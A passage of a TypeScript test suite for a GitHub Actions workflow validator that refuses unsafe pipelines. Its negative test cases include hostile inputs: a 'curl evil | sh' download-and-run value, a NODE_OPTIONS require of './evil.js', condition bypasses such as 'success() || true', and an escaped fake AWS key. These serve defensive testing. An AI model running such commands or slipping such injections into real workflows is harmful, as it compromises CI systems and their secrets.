    const r = await run([wf({ 'code-scanning': job(scriptSteps(), { permissions: { contents: 'read', 'security-events': 'write', actions: 'read' } }), watch: job(scriptSteps(), { permissions: { contents: 'read', issues: 'write' } }) })], dScripts());
    expect(r.issues.filter((i) => i.check === 'permissions' && /code-scanning/.test(i.message)).length, show(r)).toBeGreaterThan(0);
    expect(r.issues.filter((i) => i.check === 'permissions' && /watch/.test(i.message)).length, show(r)).toBeGreaterThan(0);
  });
  it('A2c, A2d: repo code before the gate action, in gate and in pipegen-verify → refused', async () => {
    const r = await run([wf({ gate: job([...scriptSteps(), gateStep()], { permissions: { contents: 'read', actions: 'read', 'pull-requests': 'read' } }) })], dScripts(), { list: LIST });
    expect(has(r, 'permissions'), show(r)).toBe(true);
    const r2 = await run([wf({ 'pipegen-verify': job([...scriptSteps(), verifyStep()], { permissions: VERIFYP }) })], dScripts(), { list: LIST });
    expect(has(r2, 'permissions'), show(r2)).toBe(true);
  });
  it('the gate and watcher actions only in their own jobs, never after repo code', async () => {
    const r = await run([wf({ t: job([...scriptSteps(), gateStep()]) })], dScripts(), { list: LIST });
    expect(r.ok, show(r)).toBe(false);
    const w: RenderedStep = { name: 'watch', uses: WATCHER.step.action?.uses as string, with: { mode: 'watcher' } };
    expect((await run([wf({ gate: job([w], { permissions: { contents: 'read', actions: 'read' } }) })], draftOf([]), { list: LIST })).ok).toBe(false);
    expect((await run([wf({ t: job([w]) })], draftOf([]), { list: LIST })).ok).toBe(false);
  });
  it('an unknown job id that is privileged (an environment, or pipegen\'s own secret) → refused', async () => {
    const g = gitleaks();
    expect(has(await run([wf({ deploy: job(g.steps, { environment: 'production' }) })], draftOf([g.spec])), 'permissions')).toBe(true);
    const login = renderPlatformStep('docker-login', p, loginInputs(), { registry: 'ghcr.io' });
    expect(has(await run([wf({ publish: job([login]) })], draftOf([])), 'permissions')).toBe(true);
  });
  it('A20: repo code, then a ./composite that holds a checker → refused (local actions are refused outright since fix round 2)', async () => {
    const g = gitleaks();
    const toolSteps = g.steps.filter((s) => !s.uses?.startsWith('actions/checkout@'));
    const doc = new Document();
    doc.contents = doc.createNode({ name: 'x', runs: { using: 'composite', steps: [] } });
    doc.setIn(['runs', 'steps'], stepsToYaml(toolSteps));
    const action = file(doc.toString({ lineWidth: 0 }), '.github/actions/scan/action.yml');
    const steps = [...scriptSteps(), { name: 'scan', uses: './.github/actions/scan' }];
    const d = draftOf([g.spec], { needs: [needOf('unit-tests', true, 'app'), needOf('secrets', true)] });
    expect(has(await run([wf({ t: job(steps) }), action], d), 'unreviewed')).toBe(true);
    // a composite that is not composite, a cycle, more than three levels: refused
    const node = file('name: n\nruns:\n  using: node24\n  main: x.js\n', '.github/actions/node/action.yml');
    expect((await run([wf({ t: job([...prelude(), { name: 'n', uses: './.github/actions/node' }]) }), node], draftOf([]))).ok).toBe(false);
    const loop = file('name: l\nruns:\n  using: composite\n  steps:\n    - uses: ./.github/actions/loop\n', '.github/actions/loop/action.yml');
    expect((await run([wf({ t: job([...prelude(), { name: 'l', uses: './.github/actions/loop' }]) }), loop], draftOf([]))).ok).toBe(false);
    const chain = [1, 2, 3, 4].map((n) => file(`name: c${n}\nruns:\n  using: composite\n  steps:\n    - uses: ./.github/actions/c${n + 1}\n`, `.github/actions/c${n}/action.yml`));
    const last = file('name: c5\nruns:\n  using: composite\n  steps: []\n', '.github/actions/c5/action.yml');
    expect((await run([wf({ t: job([{ name: 'c', uses: './.github/actions/c1' }]) }), ...chain, last], draftOf([]))).ok).toBe(false);
  });
  it('A3, A3b, A3c and a job if: a blocking scanner that scans nothing or is skipped → refused', async () => {
    const g = gitleaks();
    const skipCheckout = g.steps.map((s) => (s.uses?.startsWith('actions/checkout@') ? { ...s, if: 'failure()' } : s));
    expect(has(await run([wf({ scan: job(skipCheckout) })], draftOf([g.spec])), 'template')).toBe(true);
    const noCheckout = g.steps.filter((s) => !s.uses?.startsWith('actions/checkout@'));
    expect(has(await run([wf({ scan: job(noCheckout) })], draftOf([g.spec])), 'template')).toBe(true);
    const late = [...g.steps.filter((s) => !s.uses?.startsWith('actions/checkout@')), ...prelude()];
    expect(has(await run([wf({ scan: job(late) })], draftOf([g.spec])), 'template')).toBe(true);
    const upload = g.steps.map((s) => (s.uses?.startsWith('actions/upload-artifact@') ? { ...s, if: 'failure()', 'continue-on-error': true } : s));
    expect(has(await run([wf({ scan: job(upload) })], draftOf([g.spec])), 'template')).toBe(true);
    for (const cond of ['failure()', 'always()', '!cancelled()']) expect((await run([wf({ scan: job(g.steps, { if: cond }) })], draftOf([g.spec]))).ok, cond).toBe(false);
    // always() only on an upload; continue-on-error nowhere, even for a non-blocking check
    const runAlways = g.steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, if: 'always()' } : s));
    expect(has(await run([wf({ scan: job(runAlways) })], draftOf([g.spec])), 'template')).toBe(true);
    const soft = draftOf([g.spec]);
    soft.needs = soft.needs.map((n) => ({ ...n, blocking: false }));
    const coe = g.steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, 'continue-on-error': true } : s));
    expect(has(await run([wf({ scan: job(coe) })], soft), 'template')).toBe(true);
    // bullfrog (harden) and setup may come before the checkout
    const harden = renderStep(specOf('bullfrog', { needId: 'egress', service: undefined }), entry('bullfrog'), p, ctx).steps;
    const d = draftOf([g.spec, specOf('bullfrog', { needId: 'egress', service: undefined })]);
    expect(show(await run([wf({ scan: job([...harden, ...g.steps]) })], d))).toBe('');
  });
  it('A4: runs-on other than a GitHub-hosted label → refused', async () => {
    const g = gitleaks();
    for (const ro of [['self-hosted', 'linux'], 'self-hosted', 'ubuntu-latest-xl', ['ubuntu-latest'], { group: 'x' }]) {
      expect(has(await run([wf({ scan: job(g.steps, { 'runs-on': ro }) })], draftOf([g.spec])), 'template'), JSON.stringify(ro)).toBe(true);
    }
    for (const ro of ['ubuntu-latest', 'ubuntu-24.04', 'ubuntu-22.04', 'ubuntu-24.04-arm', 'ubuntu-22.04-arm']) {
      expect(show(await run([wf({ scan: job(g.steps, { 'runs-on': ro }) })], draftOf([g.spec]))), ro).toBe('');
    }
  });
  it('A5: triggers outside push, pull_request, merge_group, schedule, workflow_dispatch, workflow_call → refused', async () => {
    const g = gitleaks();
    for (const on of [{ pull_request_target: null }, { workflow_run: { workflows: ['x'], types: ['completed'] } }, 'issue_comment', ['push', 'pull_request_target']]) {
      expect((await run([wf({ scan: job(g.steps) }, { on })], draftOf([g.spec]))).ok, JSON.stringify(on)).toBe(false);
    }
    for (const on of ['push', ['push', 'pull_request'], { merge_group: null, schedule: [{ cron: '0 3 * * *' }], workflow_dispatch: null }]) {
      expect(show(await run([wf({ scan: job(g.steps) }, { on })], draftOf([g.spec]))), JSON.stringify(on)).toBe('');
    }
  });
  it('A15: shell on an action step → refused', async () => {
    const pre = prelude();
    expect(has(await run([wf({ a: job([{ ...(pre[0] as RenderedStep), shell: 'bash' }]) })], draftOf([])), 'template')).toBe(true);
  });
  it('A22: environment pipegen-signing only on sign and pipegen-verify', async () => {
    expect(has(await run([wf({ t: job(scriptSteps(), { environment: 'pipegen-signing' }) })], dScripts()), 'permissions')).toBe(true);
    expect(has(await run([wf({ sign: job([], { permissions: SIGNP, environment: 'pipegen-signing' }) })], draftOf([])), 'permissions')).toBe(false);
  });
  it('A8: a secret value hidden by a YAML escape is found in the parsed scalars', async () => {
    const esc = fake.awsKey().replace(/^A/, '\\x41');
    const text = `name: pipegen\non: push\npermissions: {}\nrun-name: "${esc}"\njobs:\n  a:\n    runs-on: ubuntu-latest\n    permissions: {contents: read}\n    cache-mode: none\n    steps: []\n`;
    const r = await run([file(text)], draftOf([]));
    expect(has(r, 'secret-value'), show(r)).toBe(true);
  });
  it('A9: a blocking need with no tool step and no project script → not-gate-readable', async () => {
    const g = gitleaks();
    const d = draftOf([g.spec]);
    d.needs.push(needOf('sast', true, 'app'));
    expect(has(await run([wf({ scan: job(g.steps) })], d), 'not-gate-readable')).toBe(true);
    // pipegen's own jobs (gate, signing, attestation, deploy-verify) and pre-commit needs are not tool steps
    const own = draftOf([g.spec]);
    own.needs.push(needOf('gate'), needOf('signing'), { ...needOf('hooks'), layer: 'pre-commit' });
    expect(has(await run([wf({ scan: job(g.steps) })], own), 'not-gate-readable')).toBe(false);
  });
  it('a near run step (a rendered id, other content) counts as repo code for the order rule', async () => {
    const g = gitleaks();
    const near = g.steps.map((s) => (s.id?.startsWith('tool-install-') ? { ...s, run: `${s.run as string}\necho changed` } : s));
    const r = await run([wf({ scan: job(near) })], draftOf([g.spec]));
    expect(has(r, 'template')).toBe(true);
    expect(has(r, 'injection'), show(r)).toBe(true);
  });
});

describe('fix round 1: an edited user workflow\'s own top level is judged where it reaches pipegen\'s job', () => {
  const VERIFYP = { contents: 'read', actions: 'read', packages: 'read', attestations: 'read' };
  // the gate job's step (mode gate, an empty job list: these drafts have no check the gate waits for) and the verify job's step (mode find-run)
  const gateStep = (): RenderedStep => renderGateStep(GATE, draftOf([]));
  const verifyStep = (): RenderedStep => ({ name: 'verify', uses: GATE.step.action?.uses as string, with: { mode: 'find-run', layout: 'inline' } });
  const build = (original: string, steps: RenderedStep[] = [verifyStep()]): CreatedFile => {
    const src = original.replace('  deploy:\n', '  deploy:\n    needs: [pipegen-verify]\n');
    const doc = parseDocument(`${src}  pipegen-verify:\n    runs-on: ubuntu-latest\n    permissions:\n${Object.entries(VERIFYP).map(([k, v]) => `      ${k}: ${v}\n`).join('')}    cache-mode: none\n    steps: []\n`);
    doc.setIn(['jobs', 'pipegen-verify', 'steps'], stepsToYaml(steps));
    return file(doc.toString({ lineWidth: 0 }), '.github/workflows/deploy.yml', { part: 'deploy-verify', inserted: { original, jobs: ['pipegen-verify'], needs: [{ job: 'deploy', added: ['pipegen-verify'] }] } });
  };
  const userWf = (top: string, deployIf = ''): string => ['name: deploy', ...top.split('\n').filter(Boolean), 'jobs:', '  deploy:', ...(deployIf === '' ? [] : [`    if: ${deployIf}`]), '    runs-on: ubuntu-latest', '    steps:', '      - uses: actions/checkout@v4', '      - run: ./deploy.sh', ''].join('\n');
  const d = (): PipelineDraft => draftOf([], { profile: { ...prof, existingWorkflows: [{ path: '.github/workflows/deploy.yml', triggers: ['push'], deploys: true, [`${SEC_FIELD}Used`]: [], jobs: ['deploy'] } as unknown as ExistingWorkflow] } });
  const judge = (top: string, deployIf = '', deps?: RefereeDeps): Promise<RefereeReport> => run([build(userWf(top, deployIf))], d(), { list: [...reviewedList(), GATE], ...(deps === undefined ? {} : { deps }) });
  it('a plain user workflow passes', async () => {
    expect(show(await judge('on: push'))).toBe('');
  });
  it('A6: pull_request_target, workflow_run with a checkout, a dangerous or expression env, defaults beyond run.shell bash/sh → refused', async () => {
    for (const top of ['on:\n  pull_request_target:', 'on:\n  workflow_run:\n    workflows: [ci]', 'on: push\nenv:\n  NODE_OPTIONS: --require ./evil.js', 'on: push\nenv:\n  X: ${{ github.head_ref }}',
      'on: push\ndefaults:\n  run:\n    working-directory: evil', 'on: push\ndefaults:\n  run:\n    shell: python']) {
      expect((await judge(top)).ok, top).toBe(false);
    }
    for (const top of ['on: push\nenv:\n  APP_MODE: prod', 'on: push\ndefaults:\n  run:\n    shell: bash', 'on: push\ndefaults:\n  run:\n    shell: sh']) {
      expect(show(await judge(top)), top).toBe('');
    }
  });
  it('the user\'s top-level permissions stay within what the inserted jobs may have', async () => {
    expect((await judge('on: push\npermissions: write-all')).ok).toBe(false);
    expect((await judge('on: push\npermissions:\n  contents: write')).ok).toBe(false);
    expect(show(await judge('on: push\npermissions:\n  contents: read\n  actions: read'))).toBe('');
  });
  it('a gated user job whose if runs despite a failed need → refused', async () => {
    for (const cond of ['always()', '${{ !cancelled() }}', 'failure()', "cancelled() || github.ref == 'x'"]) expect((await judge('on: push', cond)).ok, cond).toBe(false);
    expect(show(await judge('on: push', "success() && github.ref == 'refs/heads/main'"))).toBe('');
  });
  it('A23: a linter finding on the user\'s on:, env, defaults or permissions line, or on a gated job\'s if line, stays an issue', async () => {
    const text = build(userWf('on: push\nenv:\n  APP_MODE: prod', "success() && github.ref == 'refs/heads/main'")).content.split('\n');
    const lineOf = (re: RegExp): number => text.findIndex((l) => re.test(l)) + 1;
    const onAt = lineOf(/^on:/);
    const envAt = lineOf(/^env:/);
    const ifAt = lineOf(/^ {4}if:/);
    const runAt = lineOf(/deploy\.sh/);
    expect(Math.min(onAt, envAt, ifAt, runAt)).toBeGreaterThan(0);
    const deps: RefereeDeps = { runLinters: async () => [onAt, envAt, ifAt, runAt].map((line) => ({ file: '.github/workflows/deploy.yml', repo: 'app' as const, check: 'zizmor' as const, message: `finding at ${line}`, line })) };
    const r = await judge('on: push\nenv:\n  APP_MODE: prod', "success() && github.ref == 'refs/heads/main'", deps);
    expect(r.issues.map((i) => i.line).sort()).toEqual([onAt, envAt, ifAt].sort());
    expect(r.notes.join(' ')).toContain(`finding at ${runAt}`);
  });
  it('A21: an inserted job named sign running npm test → refused', async () => {
    const original = userWf('on: push');
    const doc = parseDocument(`${original}  sign:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      ${OIDC}: write\n    cache-mode: none\n    steps: []\n`);
    doc.setIn(['jobs', 'sign', 'steps'], stepsToYaml(renderProjectScript({ kind: 'project-script', needId: 'unit-tests', service: 'app', script: 'test' }, platform(), ctx).steps));
    const f = file(doc.toString({ lineWidth: 0 }), '.github/workflows/deploy.yml', { inserted: { original, jobs: ['sign'], needs: [] } });
    const dd = d();
    dd.needs.push(needOf('unit-tests', true, 'app'));
    expect(has(await run([f], dd), 'permissions')).toBe(true);
  });
  it('A7: a linter finding is matched to its file by repo and path; an ambiguous one stays an issue', async () => {
    const app = build(userWf('on: push'));
    const g = gitleaks();
    const central = { ...wf({ scan: job(g.steps) }, {}, '.github/workflows/deploy.yml'), repo: 'central' as const };
    const dd = draftOf([g.spec], { profile: d().profile });
    const userLine = app.content.split('\n').findIndex((l) => l.includes('deploy.sh')) + 1;
    expect(userLine).toBeGreaterThan(0);
    const deps = (repo?: 'app' | 'central'): RefereeDeps => ({ runLinters: async () => [{ file: '.github/workflows/deploy.yml', ...(repo === undefined ? {} : { repo }), check: 'zizmor', message: 'FINDING', line: userLine }] });
    expect(has(await run([app, central], dd, { list: [...reviewedList(), GATE], deps: deps('central') }), 'zizmor')).toBe(true);
    expect(has(await run([app, central], dd, { list: [...reviewedList(), GATE], deps: deps() }), 'zizmor')).toBe(true);
    expect(has(await run([app, central], dd, { list: [...reviewedList(), GATE], deps: deps('app') }), 'zizmor')).toBe(false);
  });
});

// ---------- fix round 2 (review-7a-r1, task-7a-fix-round-2.md): the reviewer's probes, as regression tests ----------

describe('fix round 2: the re-review probes are refused', () => {
  const p = platform();
  const LIST = [...reviewedList(), GATE, WATCHER];
  const CENTRAL = { repo: 'o/pipelines', sha: sha('c') };
  // the gate job's step (mode gate, an empty job list: these drafts have no check the gate waits for) and the verify job's step (mode find-run)
  const gateStep = (): RenderedStep => renderGateStep(GATE, draftOf([]));
  const verifyStep = (): RenderedStep => ({ name: 'verify', uses: GATE.step.action?.uses as string, with: { mode: 'find-run', layout: 'inline' } });
  const g = gitleaks();
  const base = (): string => wf({ scan: job(g.steps) }).content;
  const editedWith = (cond: string | undefined): { f: CreatedFile; d: PipelineDraft } => {
    const original = ['name: deploy', 'on: push', 'jobs:', '  deploy:', ...(cond === undefined ? [] : [`    if: ${JSON.stringify(cond)}`]), '    runs-on: ubuntu-latest', '    steps:', '      - run: ./deploy.sh', ''].join('\n');
    const text = original.replace('  deploy:\n', '  deploy:\n    needs: [pipegen-verify]\n')
      + '  pipegen-verify:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      actions: read\n      packages: read\n      attestations: read\n    cache-mode: none\n    steps: []\n';
    const doc = parseDocument(text);
    doc.setIn(['jobs', 'pipegen-verify', 'steps'], stepsToYaml([verifyStep()]));
    const f = file(doc.toString({ lineWidth: 0 }), '.github/workflows/deploy.yml', { inserted: { original, jobs: ['pipegen-verify'], needs: [{ job: 'deploy', added: ['pipegen-verify'] }] } });
    const d = draftOf([], { profile: { ...prof, existingWorkflows: [{ path: '.github/workflows/deploy.yml', triggers: ['push'], deploys: true, [`${SEC_FIELD}Used`]: [], jobs: ['deploy'] } as unknown as ExistingWorkflow] } });
    return { f, d };
  };

  it('T1: a tag or an anchor on a scalar (value or key) is refused again (S29)', async () => {
    const forms: [string, (t: string) => string][] = [
      ['!!str on a value', (t) => t.replace(/uses: actions\/checkout@/, 'uses: !!str actions/checkout@')],
      ['!!str on a key', (t) => t.replace('cache-mode: none', '!!str cache-mode: none')],
      ['a bare ! tag', (t) => t.replace('cache-mode: none', 'cache-mode: ! none')],
      ['a custom tag', (t) => t.replace('cache-mode: none', 'cache-mode: !custom none')],
      ['!!binary', (t) => t.replace('cache-mode: none', 'cache-mode: !!binary bm9uZQ==')],
      ['an &a anchor on a scalar', (t) => t.replace('cache-mode: none', 'cache-mode: &a none')],
      ['!!map', (t) => t.replace('permissions: {}', 'permissions: !!map {}')],
    ];
    for (const [label, m] of forms) {
      const text = m(base());
      expect(text, label).not.toBe(base());
      expect(has(await run([file(text)], draftOf([g.spec])), 'injection'), label).toBe(true);
    }
  });
  it('T2 and ruling 1: a gated user job\'s if: may only be success(), or success() && an expression with no status function and no top-level ||', async () => {
    const refused = ['success() || true', "${{ success() || github.event_name == 'workflow_dispatch' }}", '!success()', "success() || github.ref == 'refs/heads/main'",
      'always()', 'failure()', 'cancelled()', '!cancelled()', '${{ !cancelled() }}', 'SUCCESS() || true', "success() && github.ref == 'x' || true", 'success() && always()',
      // r2 carry-forwards: two templates read as a truthy string; unparseable conditions
      '${{ success() && x }}${{ y }}', '${{ a }}${{ b }}', '${{ a }} && b', 'success() && x) || (y', "success() && 'a || b", 'a) || (b', "'a || b", ''];
    for (const cond of refused) {
      const { f, d } = editedWith(cond);
      expect((await run([f], d, { list: LIST })).ok, cond).toBe(false);
    }
    const accepted = [undefined, 'success()', '${{ success() }}', "success() && github.ref == 'refs/heads/main'", "${{ success() && (github.ref == 'a' || github.ref == 'b') }}", "Success() && contains(github.ref, '||')", "success() && github.head_ref != 'a||b'"];
    for (const cond of accepted) {
      const { f, d } = editedWith(cond);
      expect(show(await run([f], d, { list: LIST })), String(cond)).toBe('');
    }
  });
  it('review-7a-r2 loosening: an if: with no status function is accepted (GitHub implies success() && (…)); any status call outside the success() forms, or non-ASCII, is refused', async () => {
    const accepted = ["github.ref == 'a'\n", "github.ref == 'refs/heads/main'", "${{ github.ref == 'refs/heads/main' }}", "needs.x.result == 'failure'", 'true', "github.event_name == 'push' || github.event_name == 'workflow_dispatch'"];
    for (const cond of accepted) {
      const { f, d } = editedWith(cond);
      expect(show(await run([f], d, { list: LIST })), cond).toBe('');
    }
    // over-approximated on purpose: a status name in a string literal, a space before '(', a '-' before the name; NEL (U+0085)
    // is whitespace to GitHub's .NET lexer but not to JS \s, and U+017F folds to 'S' in .NET only, so non-ASCII is refused
    const refused = ["contains(github.ref, 'always()')", 'ALWAYS ()', 'always\t()', 'x-success() || true', 'success\u0085() || true', 'ſuccess() || true', "github.ref == 'é'",
      // GitHub ends the expression at the first }}; a trailing } makes the whole value a (truthy) string template
      '${{ x }}}', '${{ success() && x }}}', '${{ {x} }}', "${{ format('{0}', x) }}",
      // whitespace outside the wrapper is part of the value (`if: |`, "\n"): GitHub reads it as a truthy string template
      '${{ success() && x }}\n', ' ${{ x }}', '${{ x }} ', '\n${{ x }}'];
    for (const cond of refused) {
      const { f, d } = editedWith(cond);
      expect((await run([f], d, { list: LIST })).ok, JSON.stringify(cond)).toBe(false);
    }
  });
  it('referee: a linter finding in an edited user file outside pipegen\'s lines is a note; inside → issue (7b)', async () => {
    const { f, d } = editedWith(undefined);
    const lines = f.content.split('\n');
    const userLine = lines.findIndex((l) => l.includes('./deploy.sh')) + 1;
    const ownLine = lines.findIndex((l) => l.includes('contents: read')) + 1;
    expect(userLine).toBeGreaterThan(0);
    expect(ownLine).toBeGreaterThan(0);
    const finding = (line: number, message: string) => ({ message, filepath: f.path, line, column: 1, kind: 'expression', snippet: '', end_column: 2 });
    const a = stub();
    a.set(JSON.stringify([finding(userLine, 'user problem'), finding(ownLine, 'pipegen problem')]), 1);
    const z = stub();
    z.set('[]');
    const r = await referee([f], d, platform(), LIST, { actionlint: async () => a.bin, zizmor: async () => z.bin }, 'gh-stub');
    expect(r.issues.map((i) => [i.check, i.line, i.message]), show(r)).toEqual([['actionlint', ownLine, 'pipegen problem']]);
    expect(r.notes.some((n) => n.includes('user problem') && n.includes(`${f.path}:${userLine}`)), r.notes.join('\n')).toBe(true);
  });
  it('T3 and ruling 4: an environment name is compared without case', async () => {
    const r = await run([wf({ gate: job([gateStep()], { permissions: { contents: 'read', actions: 'read' }, environment: 'Pipegen-Signing' }) })], draftOf([]), { list: LIST });
    expect(r.issues.some((i) => i.check === 'permissions' && /pipegen-signing/i.test(i.message)), show(r)).toBe(true);
    const v = await run([wf({ 'pipegen-verify': job([verifyStep()], { permissions: { contents: 'read', actions: 'read' }, environment: 'Pipegen-Signing' }) })], draftOf([], { capabilities: caps({ environments: true }) }), { list: LIST });
    expect(has(v, 'permissions'), show(v)).toBe(true);
    const sign = await run([wf({ sign: job([], { permissions: { contents: 'read' }, environment: { name: 'PIPEGEN-SIGNING' } }) })], draftOf([]));
    expect(has(sign, 'permissions'), show(sign)).toBe(true);
    expect(has(await run([wf({ sign: job([], { permissions: { contents: 'read' }, environment: 'pipegen-signing' }) })], draftOf([])), 'permissions')).toBe(false);
  });
  it('T4 and ruling 3: a ./ action is refused outright, in a central workflow and in the app\'s own gate job', async () => {
    const dl = renderPlatformStep('download-artifact', p, { name: 'pipegen-out-sast--app', path: '${{ runner.temp }}/pipegen-out/pipegen-out-sast--app' });
    const doc = new Document();
    doc.contents = doc.createNode({ name: 'x', runs: { using: 'composite', steps: [] } });
    doc.setIn(['runs', 'steps'], stepsToYaml([dl]));
    const action = { ...file(doc.toString({ lineWidth: 0 }), '.github/actions/fetch/action.yml'), repo: 'central' as const };
    const centralWf = { ...file(workflowText({ gate: job([...prelude(), { name: 'fetch', uses: './.github/actions/fetch' } as RenderedStep, gateStep()], { permissions: { contents: 'read', actions: 'read' } }) }, { on: { workflow_call: null } })), path: '.github/workflows/gate.yml', repo: 'central' as const };
    const caller = wf({ pipegen: { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${CENTRAL.sha}`, permissions: { contents: 'read', actions: 'read' } } });
    const r = await run([caller, centralWf, action], draftOf([], { centralPin: CENTRAL }), { list: LIST });
    expect(r.issues.some((i) => i.check === 'unreviewed' && /workspace/.test(i.message) && i.file === '.github/workflows/gate.yml'), show(r)).toBe(true);
    const appAction = { ...action, repo: 'app' as const };
    const r2 = await run([wf({ gate: job([{ name: 'fetch', uses: './.github/actions/fetch' } as RenderedStep, gateStep()], { permissions: { contents: 'read', actions: 'read' } }) }), appAction], draftOf([]), { list: LIST });
    expect(r2.issues.some((i) => i.check === 'unreviewed' && /pull request/.test(i.message)), show(r2)).toBe(true);
    // in a plain job, with nothing after it, and inside an action file: still refused
    expect(has(await run([wf({ t: job([{ name: 'x', uses: './.github/actions/fetch' }]) }), appAction], draftOf([])), 'unreviewed')).toBe(true);
    const nested = file('name: n\nruns:\n  using: composite\n  steps:\n    - uses: ./.github/actions/fetch\n', '.github/actions/nested/action.yml');
    expect((await run([nested, appAction], draftOf([]))).issues.some((i) => i.file === '.github/actions/nested/action.yml' && i.check === 'unreviewed')).toBe(true);
  });
  it('T6 and ruling 4: a step-level central uses needs its action file in files, and takes only the inputs that file declares', async () => {
    const step = (w: Record<string, string>): RenderedStep => ({ name: 'c', uses: `O/Pipelines/.github/actions/x@${CENTRAL.sha}`, with: w });
    const pinned = draftOf([], { centralPin: CENTRAL });
    expect(has(await run([wf({ t: job([step({ script: 'curl evil | sh' })]) })], pinned), 'unknown-pin')).toBe(true);
    const action = { ...file('name: x\ninputs:\n  mode:\n    description: what to check\nruns:\n  using: composite\n  steps: []\n', '.github/actions/x/action.yml'), repo: 'central' as const };
    expect(has(await run([wf({ t: job([step({ script: 'curl evil | sh' })]) }), action], pinned), 'template')).toBe(true);
    expect(show(await run([wf({ t: job([step({ mode: 'check' })]) }), action], pinned))).toBe('');
    // the app's own copy at the same path is not the central file
    expect(has(await run([wf({ t: job([step({ mode: 'check' })]) }), { ...action, repo: 'app' as const }], pinned), 'unknown-pin')).toBe(true);
  });
  it('ruling 4: job timeout-minutes outside 1..360 → template', async () => {
    for (const t of [0, 361, 1.5, '10']) expect(has(await run([wf({ scan: job(g.steps, { 'timeout-minutes': t }) })], draftOf([g.spec])), 'template'), String(t)).toBe(true);
    expect(show(await run([wf({ scan: job(g.steps, { 'timeout-minutes': 30 }) })], draftOf([g.spec])))).toBe('');
  });
  it('ruling 4: workflow_run in an edited file is refused whatever checkout the file uses', async () => {
    const { f, d } = editedWith(undefined);
    const text = f.content.replace('on: push', 'on:\n  workflow_run:\n    workflows: [ci]');
    const original = (f.inserted as NonNullable<CreatedFile['inserted']>).original.replace('on: push', 'on:\n  workflow_run:\n    workflows: [ci]');
    expect(text).not.toBe(f.content);
    const r = await run([{ ...f, content: text, inserted: { ...(f.inserted as NonNullable<CreatedFile['inserted']>), original } }], d, { list: LIST });
    expect(r.issues.some((i) => /workflow_run/.test(i.message)), show(r)).toBe(true);
  });
});

describe('C8 fix round 1: the find-run layout matches the draft', () => {
  const LIST = [...reviewedList(), GATE];
  const CENTRAL = { repo: 'o/pipelines', sha: sha('c') };
  const V = { contents: 'read', actions: 'read', packages: 'read', attestations: 'read' };
  const CW = centralWorkflowPath(CENTRAL.repo, prof.repo);
  const verify = (w: Record<string, string>): RenderedStep => ({ name: 'verify', uses: GATE.step.action?.uses as string, with: { mode: 'find-run', sha: '${{ github.sha }}', ...w } });
  const layoutIssues = async (w: Record<string, string>, d: PipelineDraft): Promise<string[]> =>
    (await run([wf({ 'pipegen-verify': job([verify(w)], { permissions: V }) })], d, { list: LIST })).issues.filter((i) => /layout|central/i.test(i.message)).map((i) => i.message);
  const inline = draftOf([]);
  const central = draftOf([], { centralPin: CENTRAL });
  it('inline for a draft without a central pin, and central for one with it, are accepted', async () => {
    expect(await layoutIssues({ layout: 'inline' }, inline)).toEqual([]);
    expect(await layoutIssues({ layout: 'central', 'central-workflow': CW, 'central-sha': CENTRAL.sha }, central)).toEqual([]);
  });
  it('a layout that does not match the draft is refused, both ways', async () => {
    expect((await layoutIssues({ layout: 'central', 'central-workflow': CW, 'central-sha': CENTRAL.sha }, inline)).length).toBeGreaterThan(0);
    expect((await layoutIssues({ layout: 'inline' }, central)).length).toBeGreaterThan(0);
  });
  it('a missing or odd layout is refused', async () => {
    expect((await layoutIssues({}, inline)).length).toBeGreaterThan(0);
    expect((await layoutIssues({ layout: 'private' }, inline)).length).toBeGreaterThan(0);
  });
  it('central-workflow must be exactly the path the renderer derives (<pin repo>/.github/workflows/<project>--merge.yml)', async () => {
    expect(CW).toBe(`o/pipelines/.github/workflows/${prof.repo}--merge.yml`);
    const w = (v: string): Record<string, string> => ({ layout: 'central', 'central-workflow': v, 'central-sha': CENTRAL.sha });
    for (const bad of [`${CW}@refs/heads/main`, `${CW}@${CENTRAL.sha}`, `o/pipelines/.github/workflows/../${prof.repo}--merge.yml`, `o/pipelines/.github/workflows/${prof.repo}--merge.yml/../x`,
      `evil/pipelines/.github/workflows/${prof.repo}--merge.yml`, 'o/pipelines/.github/workflows/other--merge.yml', `o/pipelines/.github/workflows/${prof.repo}--merge.yaml`, `${CW} `, CW.toUpperCase(), '']) {
      expect((await layoutIssues(w(bad), central)).length, bad).toBeGreaterThan(0);
    }
    expect(await layoutIssues(w(CW), central)).toEqual([]);
  });
  it('the renderer\'s find-run step is accepted by the referee, inline and central, and uses the same path', async () => {
    const i = renderFindRunStep(GATE, {});
    expect(i.with).toMatchObject({ mode: 'find-run', layout: 'inline', sha: '${{ github.sha }}' });
    expect(i.with?.['central-workflow']).toBeUndefined();
    const c = renderFindRunStep(GATE, { central: { repo: CENTRAL.repo, sha: CENTRAL.sha, project: prof.repo } });
    expect(c.with).toMatchObject({ layout: 'central', 'central-workflow': CW, 'central-sha': CENTRAL.sha });
    for (const [s, d] of [[i, inline], [c, central]] as const) {
      const r = await run([wf({ 'pipegen-verify': job([s], { permissions: V }) })], d, { list: LIST });
      expect(r.issues.filter((x) => /layout|central/i.test(x.message)), show(r)).toEqual([]);
    }
  });
  it('Part 0 (review-C8-r1 r1-2): the layout is judged against the VALIDATED central pin; a pin that centralOf refuses raises an issue', async () => {
    const evilPin = { repo: 'evil/pipelines', sha: CENTRAL.sha };
    const evilCw = centralWorkflowPath(evilPin.repo, prof.repo);
    const evil = draftOf([], { centralPin: evilPin });
    // a pin of another owner, with a central-workflow and central-sha that match it: refused (it used to pass this check)
    expect((await layoutIssues({ layout: 'central', 'central-workflow': evilCw, 'central-sha': evilPin.sha }, evil)).length).toBeGreaterThan(0);
    // a pin whose commit is not 40-hex, and a pin that is not an object-shaped pin of the owner
    const short = draftOf([], { centralPin: { repo: CENTRAL.repo, sha: 'abc123' } });
    expect((await layoutIssues({ layout: 'central', 'central-workflow': CW, 'central-sha': 'abc123' }, short)).length).toBeGreaterThan(0);
    // the inline claim for an invalid pin is refused too (it is not "no pin")
    expect((await layoutIssues({ layout: 'inline' }, evil)).length).toBeGreaterThan(0);
  });
  it('central needs central-workflow and a central-sha equal to the draft\'s pin; inline takes neither', async () => {
    expect((await layoutIssues({ layout: 'central', 'central-sha': CENTRAL.sha }, central)).length).toBeGreaterThan(0);
